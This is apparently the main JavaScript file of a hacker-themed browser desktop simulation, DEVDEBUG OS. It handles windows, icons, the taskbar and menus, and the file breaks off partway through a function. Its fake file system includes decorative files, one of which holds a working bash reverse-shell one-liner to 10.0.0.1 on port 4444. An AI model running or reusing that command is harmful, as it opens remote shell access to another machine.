/**
 * DEVDEBUG OS - Desktop Environment Simulation
 * @fileoverview Main application logic for the OS simulation
 */

import {
    GAME_CONSTANTS,
    initializeSnakeWindow,
    initializePongWindow,
    initializeTicTacToeWindow
} from './apps/game.js';
import { initializeTerminalWindow } from './SystemUtil/terminal.js';
import { initializeMapWindow } from './apps/map.js';
import { initializeEncryptrWindow } from './apps/encryptr.js';
import { initializeCalculatorWindow } from './apps/calculator.js';
import { initializeDevDebugWindow } from './profile.js';
import { initializePixelrWindow } from './apps/pixlr.js';
import { initializeSettingsWindow } from './SystemUtil/settings.js';
import { initializeNotesWindow } from './SystemUtil/notepad.js';
import { initializeChatbotWindow } from './apps/mr_robot.js';
import { initializeSysMonWindow } from './SystemUtil/process.js';
import { initializeBrowserWindow, navigateOrSearch } from './apps/browser.js';
import { initializeFilesWindow } from './SystemUtil/files.js';
import { initializeBinWindow } from './SystemUtil/bin.js';


// CONFIGURATION & CONSTANTS

/**
 * API Configuration
 * @constant {Object}
 */
const API_CONFIG = {
    OPENCAGE: {
        KEY: import.meta.env.VITE_OPENCAGE_API_KEY, // TODO: Move to environment variable
        BASE_URL: 'https://api.opencagedata.com/geocode/v1/json'
    },
    GEMINI: {
        URL: "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=",
        KEY: import.meta.env.VITE_GEMINI_KEY // TODO: Move to environment variable
    }
};

/**
 * UI & Layout Constants
 * Defines global dimensions, z-index ranges, and interaction thresholds.
 */
const UI_CONSTANTS = {
    TASKBAR_HEIGHT: 40,
    MIN_WINDOW_WIDTH: 200,
    MIN_WINDOW_HEIGHT: 150,
    DEFAULT_Z_INDEX: 100,
    DRAG_THRESHOLD: 5,
    ICON_SIZE: 36,
    DEFAULT_MUSIC_VOLUME: 0.1,
    DEFAULT_SFX_VOLUME: 0.3
};

// GAME_CONSTANTS moved to game.js

/**
* Animation & Timing Constants
* @constant {Object}
*/
const ANIMATION_CONSTANTS = {
    FADE_DURATION: 500,
    BOOT_DELAY: 1000,
    AUTH_DELAY: 2000,
    RESIZE_DEBOUNCE: 100
};


// CORE APPLICATION DATA

/**
* Window Manager - Manages all open windows and their state
* @type {Object}
*/
const WindowManager = {
    desktop: document.getElementById('desktop'),
    openWindows: {}, // Maps AppID to the window element
    nextZIndex: UI_CONSTANTS.DEFAULT_Z_INDEX,
    windowCounter: 0, // For unique DOM IDs
    isDraggingIcon: false // Flag for icon drag vs. click
};

/**
* Dynamic File System - Virtual file system structure
* @type {Object}
*/
const fileSystem = {
    'root': {
        type: 'folder',
        children: {
            'files': {
                type: 'folder',
                children: {
                    'LOG_001.dat': { type: 'file', content: 'System boot sequence initiated...\nKernel loaded successfully.\nAll services started.' },
                    'Matrix_Loop.gif': { type: 'file', content: 'GIF_DATA_STREAM::[...]' },
                    'backdoor_payloads': {
                        type: 'folder',
                        children: {
                            'reverse_shell.sh': { type: 'file', content: '#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1' }
                        }
                    }
                }
            },
            'system': {
                type: 'folder',
                children: {
                    'config.sys': { type: 'file', content: 'DEVICE=C:\\DOS\\HIMEM.SYS\nFILES=30' },
                    'kernel.bin': { type: 'file', content: 'BINARY_DATA::[PROTECTED]' }
                }
            },
            'users': {
                type: 'folder',
                children: {

                    'DevDebug': {
                        type: 'folder',
                        children: {
                            'my_notes.txt': { type: 'file', content: 'TODO:\n- Finish the kernel bypass exploit.\n- Investigate the strange traffic on port 4444.\n- Remember to delete browser history.' },
                            'secret.txt': { type: 'file', content: 'Project Alpha is a go. The target is the E-Corp mainframe. We move at dawn.' }
                        }
                    }
                }
            }
        }
    }
};


//  APPLICATION REGISTRY

const apps = {
    'browser': {
        title: 'Browser',
        icon: 'compass',
        initialWidth: 600,
        initialHeight: 450,
        content: ''
    },
    'files': {
        title: 'File Explorer',
        icon: 'folder-closed',
        initialWidth: 450,
        initialHeight: 350,
        content: '' // Dynamically generated
    },
    'notes': {
        title: 'Notepad',
        icon: 'sticky-note',
        initialWidth: 400,
        initialHeight: 300,
        content: '' // Dynamically generated
    },
    'robot': {
        title: 'Mr Robot',
        icon: 'bot-message-square',
        initialWidth: 400,
        initialHeight: 550,
        content: ''
    },
    'snake': {
        title: 'Snake',
        icon: 'line-squiggle',
        initialWidth: 500,
        initialHeight: 600,
        content: '' // Dynamically generated
    },
    'encryptr': {
        title: 'Encryptr',
        icon: 'lock-open',
        initialWidth: 650,
        initialHeight: 400,
        content: ''
    },
    'sysmon': {
        title: 'Process Explorer',
        icon: 'activity',
        initialWidth: 450,
        initialHeight: 300,
        minWidth: 450,
        minHeight: 300,
        content: '' // Dynamically generated
    },
    'system-properties': {
        title: 'System Properties',
        icon: 'info',
        initialWidth: 350,
        initialHeight: 250,
        minWidth: 350,
        minHeight: 250,
        content: '' // Dynamically generated
    },
    'pong': {
        title: 'Pong',
        icon: 'eclipse',
        initialWidth: 800,
        initialHeight: 600,
        minWidth: 800,
        minHeight: 600,
        content: '' // Dynamically generated
    },
    'tictactoe': {
        title: 'TicTacToe',
        icon: 'grid-3x3',
        initialWidth: 400,
        initialHeight: 500,
        content: '' // Dynamically generated
    },
    'bin': {
        title: 'Recycle Bin',
        icon: 'trash',
        initialWidth: 400,
        initialHeight: 300,
        content: '' // Dynamically generated
    },
    'terminal': {
        title: 'Terminal',
        icon: 'terminal',
        initialWidth: 600,
        initialHeight: 400,
        minWidth: 600,
        minHeight: 400,
        content: '' // Dynamically generated
    },
    'devdebug-profile': {
        title: 'User Profile: DevDebug',
        icon: 'user-circle',
        initialWidth: 850,
        initialHeight: 500,
        minWidth: 850,
        minHeight: 450,
        content: '' // Dynamically generated
    },
    'pixelr': {
        title: 'Pixelr',
        icon: 'paintbrush',
        initialWidth: 600,
        initialHeight: 600,
        content: '' // Dynamically generated
    },
    'settings': {
        title: 'Settings',
        icon: 'settings',
        initialWidth: 750,
        initialHeight: 500,
        minWidth: 750,
        minHeight: 500,
        content: '' // Dynamically generated
    },
    'map': {
        title: 'Map',
        icon: 'map',
        initialWidth: 800,
        initialHeight: 600,
        minWidth: 800,
        minHeight: 500,
        content: '' // Dynamically generated
    },
    'calculator': {
        title: 'Calculator',
        icon: 'calculator',
        initialWidth: 350,
        initialHeight: 500,
        minWidth: 350,
        minHeight: 500,
        content: '' // Dynamically generated
    }
};


// APPLICATION INITIALIZERS (Core & Legacy)

/**
 * --- SYSTEM PROPERTIES APP ---
 * Displays OS version, hardware specs, and real-time system stats.
 */
function initializeSystemPropertiesWindow(windowElement) {
    windowElement.querySelector('.window-content').innerHTML = `
              <div class="p-4 text-sm space-y-3">
                  <div class="flex justify-between">
                      <span style="color: var(--text-color-dim);">OS Version:</span>
                      <span class="font-bold" style="color: var(--primary-color);">DEVDEBUG OS v1.0.0</span>
                  </div>
                  <div class="flex justify-between">
                      <span style="color: var(--text-color-dim);">System Uptime:</span>
                      <span id="system-uptime" class="font-bold" style="color: var(--primary-color);">00:00:00</span>
                  </div>
                  <div class="flex justify-between">
                      <span style="color: var(--text-color-dim);">Active Processes:</span>
                      <span id="active-processes" class="font-bold" style="color: var(--primary-color);">0</span>
                  </div>
                  <div class="flex justify-between">
                      <span style="color: var(--text-color-dim);">Processor</span>
                      <span class="font-bold" style="color: var(--primary-color);">Intel 4004</span>
                  </div>
                  <div class="flex justify-between">
                      <span style="color: var(--text-color-dim);">GPU</span>
                      <span class="font-bold" style="color: var(--primary-color);">NVIDIA Geforce 256</span>
                  </div>
              </div>
          `;

    const uptimeEl = windowElement.querySelector('#system-uptime');
    const processesEl = windowElement.querySelector('#active-processes');
    const startTime = window.osStartTime;

    const updateStats = () => {
        const uptime = new Date() - startTime;
        uptimeEl.textContent = new Date(uptime).toISOString().substr(11, 8);
        processesEl.textContent = Object.keys(WindowManager.openWindows).length;
    };

    const intervalId = setInterval(updateStats, 1000);
    windowElement.cleanup = () => clearInterval(intervalId);
    updateStats(); // Initial call
}



//  WINDOW MANAGEMENT & CORE OS LOGIC

/**
 * Closes a single instance of an application, identified by its appId.
 * @param {string} appId - The unique ID of the application (e.g., 'browser').
 * @throws {Error} If appId is invalid or window doesn't exist
 */
function closeApp(appId) {
    if (!appId || typeof appId !== 'string') {
        console.error('closeApp: Invalid appId provided');
        return;
    }

    const windowElement = WindowManager.openWindows[appId];
    if (windowElement) {
        // Disconnect resize observer if it exists on the window element
        if (windowElement.resizeObserver) {
            windowElement.resizeObserver.disconnect();
            windowElement.resizeObserver = null;
        }

        // Run cleanup function if it exists (important for games/observers)
        if (windowElement.cleanup) {
            windowElement.cleanup();
        }

        // Specific legacy cleanup for map (can be removed if map stores everything on windowElement)
        if (appId === 'map' && window.mapResizeObserver) {
            window.mapResizeObserver.disconnect();
            window.mapResizeObserver = null;
        }

        windowElement.remove();
        delete WindowManager.openWindows[appId]; // Remove from tracking map
    }
}

/**
 * Minimizes an application window.
 * @param {string} appId - The unique ID of the application.
 */
function minimizeApp(appId) {
    const windowElement = WindowManager.openWindows[appId];
    if (windowElement) {
        windowElement.style.display = 'none'; // Hide the window
        windowElement.isMinimized = true;
        updateAppTray(); // Update the tray to show it's no longer active
    }
}

/**
 * Toggles an application window between maximized and restored states.
 * @param {string} appId - The unique ID of the application.
 */
function toggleMaximizeApp(appId) {
    const windowElement = WindowManager.openWindows[appId];
    if (!windowElement) return;

    const titleBar = windowElement.querySelector('.title-bar');
    const maximizeBtn = windowElement.querySelector('.maximize-btn');

    if (windowElement.isMaximized) {
        // --- RESTORE ---
        windowElement.style.top = windowElement.previousState.top;
        windowElement.style.left = windowElement.previousState.left;
        windowElement.style.width = windowElement.previousState.width;
        windowElement.style.height = windowElement.previousState.height;

        windowElement.isMaximized = false;
        windowElement.classList.remove('maximized');
        titleBar.style.cursor = 'grab';

        maximizeBtn.innerHTML = '';
    } else {
        // --- MAXIMIZE ---
        windowElement.previousState = {
            top: windowElement.style.top,
            left: windowElement.style.left,
            width: windowElement.style.width,
            height: windowElement.style.height,
        };

        windowElement.style.top = '0px';
        windowElement.style.left = '0px';
        windowElement.style.width = '100%';
        windowElement.style.height = `calc(100% - ${UI_CONSTANTS.TASKBAR_HEIGHT}px)`; // Account for taskbar

        windowElement.isMaximized = true;
        windowElement.classList.add('maximized');
        titleBar.style.cursor = 'default';

        maximizeBtn.innerHTML = '';
    }
    lucide.createIcons({ nodes: maximizeBtn.querySelectorAll('i') });
}


/**
 * Brings a window to the front and focuses it
 * @param {HTMLElement} windowElement - The window element to focus
 */
function focusWindow(windowElement) {
    if (!windowElement || !(windowElement instanceof HTMLElement)) {
        console.error('focusWindow: Invalid window element');
        return;
    }

    // Increase zIndex and ensure the window is on top
    WindowManager.nextZIndex += 1;
    windowElement.style.zIndex = WindowManager.nextZIndex;
    updateAppTray(); // Re-render the tray to show the new active window
}

/**
 * Makes a window draggable via its title bar
 * @param {HTMLElement} windowElement - The window element to make draggable
 * @param {HTMLElement} dragHandle - The element that acts as the drag handle (title bar)
 */
function makeDraggable(windowElement, dragHandle) {
    if (!windowElement || !dragHandle) {
        console.error('makeDraggable: Invalid parameters');
        return;
    }

    let offsetX, offsetY;

    // Prevent dragging if the window is maximized
    if (windowElement.isMaximized) return;

    const onMouseDown = (e) => {
        // If the mousedown is on a button within the title bar, ignore it to allow the button's click event to fire.
        if (e.target.closest('button')) {
            return;
        }

        if (e.button !== 0) return;
        focusWindow(windowElement);

        const rect = windowElement.getBoundingClientRect();
        offsetX = e.clientX - rect.left;
        offsetY = e.clientY - rect.top;

        dragHandle.style.cursor = 'grabbing';
        document.addEventListener('mousemove', onMouseMove);
        document.addEventListener('mouseup', onMouseUp);
        e.preventDefault();
    };

    const onMouseMove = (e) => {
        let newX = e.clientX - offsetX;
        let newY = e.clientY - offsetY;

        const desktopRect = WindowManager.desktop.getBoundingClientRect();
        newX = Math.max(0, Math.min(newX, desktopRect.width - windowElement.offsetWidth));
        newY = Math.max(0, Math.min(newY, desktopRect.height - windowElement.offsetHeight - UI_CONSTANTS.TASKBAR_HEIGHT));

        windowElement.style.left = `${newX}px`;
        windowElement.style.top = `${newY}px`;
    };

    const onMouseUp = () => {
        dragHandle.style.cursor = 'grab';
        document.removeEventListener('mousemove', onMouseMove);
        document.removeEventListener('mouseup', onMouseUp);
    };

    dragHandle.addEventListener('mousedown', onMouseDown);
}

/**
 * Makes a window resizable via a resize handle
 * @param {HTMLElement} windowElement - The window element to make resizable
 * @param {HTMLElement} resizeHandle - The resize handle element
 */
function makeResizable(windowElement, resizeHandle) {
    if (!windowElement || !resizeHandle) {
        console.error('makeResizable: Invalid parameters');
        return;
    }

    let startX, startY, initialWidth, initialHeight;

    // Prevent resizing if the window is maximized
    if (windowElement.isMaximized) return;

    const onMouseDown = (e) => {
        if (e.button !== 0) return;
        focusWindow(windowElement); // Focus on resize start

        startX = e.clientX;
        startY = e.clientY;
        initialWidth = windowElement.offsetWidth;
        initialHeight = windowElement.offsetHeight;

        document.addEventListener('mousemove', onMouseMove);
        document.addEventListener('mouseup', onMouseUp);
        e.preventDefault();
    };

    const onMouseMove = (e) => {
        const dx = e.clientX - startX;
        const dy = e.clientY - startY;

        let newWidth = initialWidth + dx;
        let newHeight = initialHeight + dy;

        const minW = windowElement.minWidth || UI_CONSTANTS.MIN_WINDOW_WIDTH;
        const minH = windowElement.minHeight || UI_CONSTANTS.MIN_WINDOW_HEIGHT;

        windowElement.style.width = `${Math.max(minW, newWidth)}px`;
        windowElement.style.height = `${Math.max(minH, newHeight)}px`;
    };

    const onMouseUp = () => {
        document.removeEventListener('mousemove', onMouseMove);
        document.removeEventListener('mouseup', onMouseUp);
    };

    resizeHandle.addEventListener('mousedown', onMouseDown);
}

/**
 * Desktop Icon Management
 * Handles dragging, double-clicking, and basic icon interactions.
 */

/**
 * Enables dragging for desktop icons with a snap-back and boundary check.
 * @param {HTMLElement} iconElement - The icon element to make draggable.
 */
function makeIconDraggable(iconElement) {
    let startX, startY, offsetX, offsetY;
    let dragged = false;
    const DRAG_THRESHOLD = UI_CONSTANTS.DRAG_THRESHOLD;

    const onMouseDown = (e) => {
        if (e.button !== 0) return;

        startX = e.clientX;
        startY = e.clientY;
        dragged = false;

        const rect = iconElement.getBoundingClientRect();
        offsetX = e.clientX - rect.left;
        offsetY = e.clientY - rect.top;

        iconElement.style.cursor = 'grabbing';

        document.addEventListener('mousemove', onMouseMove);
        document.addEventListener('mouseup', onMouseUp);
        e.preventDefault();
        e.stopPropagation();
    };

    const onMouseMove = (e) => {
        const dx = e.clientX - startX;
        const dy = e.clientY - startY;

        if (Math.abs(dx) > DRAG_THRESHOLD || Math.abs(dy) > DRAG_THRESHOLD) {
            dragged = true;
            // Set global flag to prevent accidental actions on mouseup
            WindowManager.isDraggingIcon = true;

            const newX = e.clientX - offsetX;
            const newY = e.clientY - offsetY;

            // Apply boundaries
            const desktopRect = WindowManager.desktop.getBoundingClientRect();
            const newLeft = Math.max(0, Math.min(newX, desktopRect.width - iconElement.offsetWidth));
            // Keep icon above the taskbar
            const newTop = Math.max(0, Math.min(newY, desktopRect.height - iconElement.offsetHeight - UI_CONSTANTS.TASKBAR_HEIGHT));

            iconElement.style.left = `${newLeft}px`;
            iconElement.style.top = `${newTop}px`;
        }
        e.stopPropagation();
    };

    const onMouseUp = () => {
        iconElement.style.cursor = 'default';
        document.removeEventListener('mousemove', onMouseMove);
        document.removeEventListener('mouseup', onMouseUp);

        // If it was dragged, snap to grid and reset the global flag after a short delay
        if (dragged) {
            const GRID_SIZE = 100;
            const PADDING = 20;

            let currentLeft = parseFloat(iconElement.style.left);
            let currentTop = parseFloat(iconElement.style.top);

            // Snap to nearest grid point
            let snappedLeft = Math.round((currentLeft - PADDING) / GRID_SIZE) * GRID_SIZE + PADDING;
            let snappedTop = Math.round((currentTop - PADDING) / GRID_SIZE) * GRID_SIZE + PADDING;

            // Boundary checks again after snapping
            const desktopRect = WindowManager.desktop.getBoundingClientRect();
            snappedLeft = Math.max(PADDING, Math.min(snappedLeft, desktopRect.width - iconElement.offsetWidth - PADDING));
            snappedTop = Math.max(PADDING, Math.min(snappedTop, desktopRect.height - iconElement.offsetHeight - UI_CONSTANTS.TASKBAR_HEIGHT - PADDING));

            iconElement.style.transition = 'all 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
            iconElement.style.left = `${snappedLeft}px`;
            iconElement.style.top = `${snappedTop}px`;

            // Remove transition after finish to not interfere with dragging next time
            setTimeout(() => {
                iconElement.style.transition = '';
                WindowManager.isDraggingIcon = false;
            }, 200);
        }
    };

    iconElement.addEventListener('mousedown', onMouseDown);
}

/**
 * Custom click handler for desktop icons (double-click)
 * @param {HTMLElement} iconElement - The icon element that was clicked
 * @param {string} appId - The application ID to open
 */
function handleIconClick(iconElement, appId) {
    if (!iconElement || !appId) {
        console.error('handleIconClick: Invalid parameters');
        return;
    }

    // Check if dragging occurred, although dblclick should handle this gracefully
    if (!WindowManager.isDraggingIcon) {
        openApp(appId);
    }
}
// --- MAIN LOGIC ---

/**
 * Opens an application window
 * @param {string} appId - The unique ID of the application to open
 * @returns {void}
 */
function openApp(appId) {
    if (!appId || typeof appId !== 'string') {
        console.error('openApp: Invalid appId provided');
        return;
    }

    // Check if app is already open (Single Instance Logic)
    if (WindowManager.openWindows[appId]) {
        focusWindow(WindowManager.openWindows[appId]);
        return;
    }

    const appConfig = apps[appId];
    if (!appConfig) {
        console.error(`Application configuration not found for ID: ${appId}`);
        return;
    }

    WindowManager.windowCounter++;
    const windowId = `${appId}-${WindowManager.windowCounter}`;

    const windowElement = document.createElement('div');
    windowElement.id = windowId;
    windowElement.className = `window p-0`;
    windowElement.style.width = `${appConfig.initialWidth}px`;
    windowElement.style.height = `${appConfig.initialHeight}px`;

    // Set minimum sizes if specified
    windowElement.minWidth = appConfig.minWidth;
    windowElement.minHeight = appConfig.minHeight;

    // Center the window on open
    const desktopRect = WindowManager.desktop.getBoundingClientRect();
    const windowWidth = appConfig.initialWidth;
    const windowHeight = appConfig.initialHeight;
    const topOffset = (desktopRect.height - windowHeight) / 2;
    const leftOffset = (desktopRect.width - windowWidth) / 2;
    windowElement.style.top = `${Math.max(0, topOffset)}px`;
    windowElement.style.left = `${Math.max(0, leftOffset)}px`;

    focusWindow(windowElement);

    windowElement.innerHTML = `
        <!-- Title Bar -->
        <div class="title-bar p-2 flex items-center justify-between text-sm font-semibold">
            <div class="flex items-center space-x-2">
                <!-- Use Lucide icon based on config -->
                <i data-lucide="${appConfig.icon}" class="w-5 h-5"></i>
                <span>${appConfig.title}</span>
            </div>
            <div class="flex items-center space-x-1">
                <button class="minimize-btn w-3 h-3 rounded-none flex items-center justify-center font-bold transition-colors duration-150"
                        title="Minimize Window">
                    <!-- _ -->
                </button>
                <button class="maximize-btn w-3 h-3 rounded-none flex items-center justify-center transition-colors duration-150"
                        title="Maximize Window">
                    
                </button>
                <button class="close-btn w-3 h-3 rounded-none flex items-center justify-center transition-colors duration-150"
                        title="Close Window">
                    <!-- X -->
                </button>
            </div>
        </div>

        <!-- Window Content (Placeholder for initializer) -->
        <div class="window-content flex-grow flex flex-col overflow-auto">
            ${appConfig.content}
        </div>

        <!-- Resize Handle (Bottom Right Corner) -->
        <div class="resize-handle bg-transparent transition-all duration-150"></div>
    `;

    WindowManager.desktop.appendChild(windowElement);
    WindowManager.openWindows[appId] = windowElement; // Store by appId

    // Re-render Lucide icons inside the new window
    lucide.createIcons({ attr: 'data-lucide', className: 'lucide-icon' });



    if (appId === 'browser') {
        initializeBrowserWindow(windowElement, { API_CONFIG });
    }
    if (appId === 'robot') {
        initializeChatbotWindow(windowElement, { API_CONFIG });
    }
    if (appId === 'notes') {
        initializeNotesWindow(windowElement, { fileSystem, WindowManager, focusWindow });
    }
    if (appId === 'snake') {
        initializeSnakeWindow(windowElement, WindowManager);
    }
    if (appId === 'encryptr') {
        initializeEncryptrWindow(windowElement);
    }
    if (appId === 'sysmon') {
        initializeSysMonWindow(windowElement, { WindowManager, apps, closeApp });
    }
    if (appId === 'pong') {
        initializePongWindow(windowElement, WindowManager);
    }
    if (appId === 'tictactoe') {
        initializeTicTacToeWindow(windowElement);
    }
    if (appId === 'files') {
        initializeFilesWindow(windowElement, { fileSystem, openApp, WindowManager, focusWindow });
    }
    if (appId === 'system-properties') {
        initializeSystemPropertiesWindow(windowElement);
    }
    if (appId === 'bin') {
        initializeBinWindow(windowElement);
    }
    if (appId === 'terminal') {
        initializeTerminalWindow(windowElement, { fileSystem, WindowManager, apps, openApp, closeApp });
    }
    if (appId === 'devdebug-profile') {
        (async () => {
            await initializeDevDebugWindow(windowElement, { openApp, WindowManager, focusWindow, navigateOrSearch: (win, query, isInternal) => navigateOrSearch(win, query, isInternal, { API_CONFIG }) });
        })();
    }
    if (appId === 'pixelr') {
        initializePixelrWindow(windowElement);
    }
    if (appId === 'settings') {
        initializeSettingsWindow(windowElement, { openApp });
    }
    if (appId === 'map') {
        initializeMapWindow(windowElement, { API_CONFIG, ANIMATION_CONSTANTS });
    }
    if (appId === 'calculator') {
        initializeCalculatorWindow(windowElement);
    }
    // FIX: Store map resize observer globally to disconnect on close
    if (appId === 'map' && windowElement.resizeObserver) {
        window.mapResizeObserver = windowElement.resizeObserver;
    }



    const titleBar = windowElement.querySelector('.title-bar');
    const minimizeBtn = windowElement.querySelector('.minimize-btn');
    const maximizeBtn = windowElement.querySelector('.maximize-btn');
    const closeBtn = windowElement.querySelector('.close-btn');
    const resizeHandle = windowElement.querySelector('.resize-handle');

    minimizeBtn.addEventListener('click', () => minimizeApp(appId));
    maximizeBtn.addEventListener('click', () => toggleMaximizeApp(appId));
    // Pass appId to closeApp
    closeBtn.addEventListener('click', () => closeApp(appId));

    windowElement.addEventListener('mousedown', (e) => {
        if (e.target.closest('.title-bar') === titleBar) return;
        focusWindow(windowElement);
    });

    // Only make draggable/resizable if not maximized
    if (!windowElement.isMaximized) {
        makeDraggable(windowElement, titleBar);
        makeResizable(windowElement, resizeHandle);
    }
}


//  TASKBAR & TRAY SYSTEM

/**
 * Sets up click and double-click event listeners for all desktop icons.
 * Handles selection state and opening apps.
 */
function setupDesktopIcons() {
    const icons = document.querySelectorAll('.desktop-icon');

    icons.forEach(icon => {
        const appId = icon.dataset.appId;

        // Prevent dragging from triggering a click selection if we want to be strict,
        // but usually, a click is fine.
        icon.addEventListener('click', (e) => {
            e.stopPropagation();
            // Clear other selections
            icons.forEach(i => i.classList.remove('selected'));
            // Select this one
            icon.classList.add('selected');
        });

        if (appId) {
            icon.addEventListener('dblclick', (e) => {
                e.stopPropagation();
                openApp(appId);
                icon.classList.remove('selected');
            });
        }
    });

    // Clear selection when clicking on the desktop background
    WindowManager.desktop.addEventListener('click', (e) => {
        if (e.target === WindowManager.desktop) {
            icons.forEach(i => i.classList.remove('selected'));
        }
    });
}

/**
 * Shows a context menu for a taskbar icon.
 * @param {number} x - The clientX position for the menu.
 * @param {number} y - The clientY position for the menu.
 * @param {string} appId - The ID of the app to be closed.
 */
function showTaskbarAppContextMenu(x, y, appId) {
    const contextMenu = document.getElementById('context-menu');
    const contextMenuItems = document.getElementById('context-menu-items');

    contextMenuItems.innerHTML = `
              <li data-action="close-app" data-appid="${appId}" class="p-2 text-sm cursor-pointer hover:bg-red-900" style="color: var(--danger-color);">Close</li>
          `;

    // Position menu above the taskbar
    const menuHeight = 40; // Estimate menu height
    contextMenu.style.top = `${y - menuHeight}px`;
    contextMenu.style.left = `${x}px`;
    contextMenu.classList.remove('hidden');
}

/**
 * Updates the taskbar application tray to reflect open windows and active state.
 * This is called whenever a window is opened, closed, or focused.
 */
function updateAppTray() {
    const appTray = document.getElementById('app-tray');
    appTray.innerHTML = '';

    for (const appId in WindowManager.openWindows) {
        const appConfig = apps[appId];
        const windowElement = WindowManager.openWindows[appId]; // Get the correct window element
        const appIcon = document.createElement('button');
        appIcon.className = 'taskbar-app-icon h-full px-3 flex items-center justify-center';
        appIcon.title = appConfig.title;
        appIcon.innerHTML = `<i data-lucide="${appConfig.icon}" class="w-5 h-5"></i>`;

        if (parseInt(windowElement.style.zIndex) === WindowManager.nextZIndex) appIcon.classList.add('active');

        // Left-click to focus or restore/minimize
        appIcon.addEventListener('click', () => {
            if (windowElement.isMinimized) {
                // Restore and focus
                windowElement.style.display = 'flex';
                windowElement.isMinimized = false;
                focusWindow(windowElement);
            } else if (appIcon.classList.contains('active')) {
                // If it's already the active window, minimize it
                minimizeApp(appId);
            } else {
                // If it's not active, just focus it
                focusWindow(windowElement);
            }
        });

        // Right-click to show close menu
        appIcon.addEventListener('contextmenu', (e) => {
            e.preventDefault();
            e.stopPropagation(); // Prevent desktop context menu
            showTaskbarAppContextMenu(e.clientX, e.clientY, appId);
        });

        appTray.appendChild(appIcon);
    }
    lucide.createIcons({ nodes: appTray.querySelectorAll('[data-lucide]') });
}


// SYSTEM SERVICES (Clock, Context Menu, Music, etc.)

/**
 * Initializes the system clock and date display in the tray.
 */
function initTime() {
    const timeDisplay = document.getElementById('current-time-display');
    const dateDisplay = document.getElementById('current-date-display');
    function updateTime() {
        const now = new Date();

        const day = String(now.getDate()).padStart(2, '0');
        const month = String(now.getMonth() + 1).padStart(2, '0'); // Months are 0-indexed
        const year = now.getFullYear();
        const dateStr = `${day}.${month}.${year}`; // Use dot separator

        const timeStr = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
        timeDisplay.textContent = timeStr;
        dateDisplay.textContent = dateStr;
    }
    updateTime();
    setInterval(updateTime, 1000);
}

function initContextMenu() {
    const contextMenu = document.getElementById('context-menu');
    const contextMenuItems = document.getElementById('context-menu-items');

    document.addEventListener('contextmenu', (e) => {
        e.preventDefault();

        // Do not show the desktop context menu if right-clicking on a window or a taskbar icon.
        if (e.target.closest('.window') || e.target.closest('.taskbar-app-icon')) {
            contextMenu.classList.add('hidden');
            return;
        }

        // Show the desktop menu if the click is anywhere on the desktop container.
        if (!e.target.closest('#desktop')) return;

        const isFullScreen = !!document.fullscreenElement;
        const fullScreenText = isFullScreen ? 'Exit Full Screen' : 'Full Screen';

        contextMenuItems.innerHTML = `
                  <li data-action="refresh" class="p-2 text-sm cursor-pointer hover:bg-blue-900" style="color: var(--text-color-dim);">Refresh</li>
                  <li data-action="fullscreen" class="p-2 text-sm cursor-pointer hover:bg-blue-900" style="color: var(--text-color-dim);">${fullScreenText}</li>
                  <li data-action="settings" class="p-2 text-sm cursor-pointer hover:bg-blue-900" style="color: var(--text-color-dim);">Settings</li>
                  <li data-action="properties" class="p-2 text-sm cursor-pointer hover:bg-blue-900" style="color: var(--text-color-dim);">System Properties</li>
                  <li data-action="shutdown" class="p-2 text-sm cursor-pointer hover:bg-red-900" style="color: var(--danger-color);">Shutdown</li>
              `;

        contextMenu.style.top = `${e.clientY}px`;
        contextMenu.style.left = `${e.clientX}px`;
        contextMenu.classList.remove('hidden');
    });

    // Hide menu on left-click
    document.addEventListener('click', () => {
        contextMenu.classList.add('hidden');
    });

    // Handle actions
    contextMenu.addEventListener('click', (e) => {
        const action = e.target.dataset.action;
        if (action === 'close-app') {
            const appIdToClose = e.target.dataset.appid;
            if (appIdToClose) closeApp(appIdToClose);
        }

        if (action === 'refresh') {
            const desktop = document.getElementById('desktop');
            desktop.style.transition = 'opacity 0.01s ease-in-out';
            desktop.style.opacity = '0.5';
            setTimeout(() => {
                lucide.createIcons(); // Redraw icons
                desktop.style.opacity = '1';
            }, 100);
        }
        else if (action === 'fullscreen') {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen().catch(err => {
                    alert(`Error attempting to enable full-screen mode: ${err.message} (${err.name})`);
                });
            } else {
                document.exitFullscreen();
            }
        }
        else if (action === 'properties') {
            openApp('system-properties');
        }
        else if (action === 'settings') {
            openApp('settings');
        }
        else if (action === 'shutdown') {
            document.body.innerHTML = '<div class="w-screen h-screen flex items-center justify-center bg-black text-2xl" style="color: var(--primary-color);">SYSTEM SHUTDOWN</div>';
            // In a real scenario, you might close connections, save state, etc.
            setTimeout(() => { document.body.innerHTML = ''; document.body.style.backgroundColor = 'black'; }, 2000);
        }
        contextMenu.classList.add('hidden');
    });

    // Update context menu item to open new settings app
    const uiConfigItem = contextMenuItems.querySelector('[data-action="ui-config"]');
    if (uiConfigItem) { uiConfigItem.dataset.action = 'settings'; uiConfigItem.textContent = 'Settings'; }
}

/**
 * Initializes the background music controller and volume logic.
 */
function initMusic() {
    const music = document.getElementById('background-music');
    const muteBtn = document.getElementById('music-mute-btn');
    const volumeSlider = document.getElementById('volume-slider');

    music.volume = UI_CONSTANTS.DEFAULT_MUSIC_VOLUME;
    let isPlaying = false;
    let lastVolume = music.volume;

    // This function will be called after authentication
    const updateIcon = () => {
        let icon = 'volume-2';
        if (music.volume === 0) icon = 'volume-x';
        else if (music.volume < 0.5) icon = 'volume-1';
        muteBtn.innerHTML = `<i data-lucide="${icon}" class="w-5 h-5" style="color: var(--text-color-dim);"></i>`;
        lucide.createIcons({ nodes: [muteBtn.querySelector('i')] });
    };

    const toggleMute = () => {
        if (music.volume > 0) {
            lastVolume = music.volume;
            music.volume = 0;
        } else {
            music.volume = lastVolume;
        }
        volumeSlider.value = music.volume;
        updateIcon();
    };

    muteBtn.addEventListener('click', toggleMute);
    volumeSlider.addEventListener('input', () => {
        music.volume = parseFloat(volumeSlider.value);
        updateIcon();
    });

    volumeSlider.value = music.volume;
    updateIcon();
}

/**
 * Initializes the Start Menu with the app list and power options.
 */
function initStartMenu() {
    const startBtn = document.getElementById('start-btn');
    const startMenu = document.getElementById('start-menu');
    const startMenuAppsList = document.getElementById('start-menu-apps');
    const restartBtn = document.getElementById('start-menu-restart');
    const shutdownBtn = document.getElementById('start-menu-shutdown');
